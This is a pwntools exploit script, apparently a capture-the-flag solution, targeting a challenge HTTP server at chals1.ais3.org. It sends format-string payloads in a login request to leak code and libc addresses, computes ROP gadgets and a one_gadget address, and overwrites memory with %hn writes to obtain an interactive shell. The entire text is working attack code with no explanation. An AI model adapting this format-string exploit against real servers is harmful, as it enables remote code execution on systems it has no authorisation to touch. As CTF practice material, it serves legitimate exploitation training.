from pwn import *

#r = process('./httpd')
r = remote('chals1.ais3.org',4444)
#r.sendline(b'123')

#payload ="POST /login Content-Length: 123\r\n\r\nName=123\r\nPassword=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
fmt = '%6$pggg%1072$p'
#fmt = '%10$p'
payload =f"POST /login Content-Length: 123\r\n\r\nName=123Password=aaaa{fmt}\r\n"
r.send(payload)
code = int(r.recvuntil(b'ggg',drop=True),16) - 0x180b

libc = int(r.recvuntil(b'HTTP',drop=True),16) -0x24083
r.recv(100)
print(hex(code))
print(hex(libc))

pop_rdi_ret = code + 0x19ab
pop_rsi_r15_ret = code + 0x19a9
one_gadget = libc + 0xe3b01
count = one_gadget & 0xffffffff

high = (count >> 16) & 0xffff
low = count & 0xffff
print(hex(high))
print(hex(low))
print(hex(count))

fmt = f'%{high}c%568$hn%{low-high}c%567$hn'.encode().ljust(32,b'c')
#fmt = f'%{high}c%568$hn%'.encode().ljust(32,b'c')
payload = b"POST /login Content-Length: 123\r\n\r\nName=123Password=aaaa" + fmt + b"\r\n" + b'cccccc' + p64(code+0x4018) + p64(code+0x401a)
r.send(payload)
#print(r.recv(100))
r.interactive()